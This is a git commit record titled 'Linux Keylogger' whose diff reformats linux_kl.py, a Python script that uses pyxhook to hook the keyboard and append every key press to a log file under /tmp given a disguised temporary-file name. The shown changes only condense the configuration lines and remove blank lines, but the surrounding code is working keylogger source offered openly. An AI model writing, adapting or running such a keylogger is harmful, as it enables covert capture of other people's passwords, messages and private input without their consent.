92519afb8da8d99a492770b70fcef0a8c4f7a871
laizz42 <felixhellmich@protonmail.ch>
2021-01-02 22:49:48 +0000

    Linux Keylogger

--- linux_kl.py
+++ linux_kl.py
@@ -3,19 +3,10 @@
 import os
 import pyxhook
 
-# log file
-log_file = os.environ.get(
-        'pylogger_file',
-        os.path.expanduser('/tmp/Temp-707e7c0e-ee87-4859-1337-55e7624706d7')
-        )
-
+# create and set log file
+log_file = os.environ.get('pylogger_file', os.path.expanduser('/tmp/Temp-707e7c0e-ee87-4859-1337-55e7624706d7'))
 # allows setting cancel key from environment args, Default: `
-cancel_key = ord(
-        os.environ.get(
-            'pylogger_cancel',
-            '`'
-            )[0]
-        )
+cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])
 
 # allow clearing log file on start (if pylogger_clean is defined)
 if os.environ.get('pylogger_clean', None) is not None:
@@ -24,7 +15,6 @@ if os.environ.get('pylogger_clean', None) is not None:
     except EnvironmentError:
         # no existing log file, or no permissions
         pass
-
 # catches events & safes them in the log file
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
@@ -33,7 +23,6 @@ def OnKeyPress(event):
 # creates hook manager object
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress
-
 # set the hook
 new_hook.HookKeyboard()
 try:
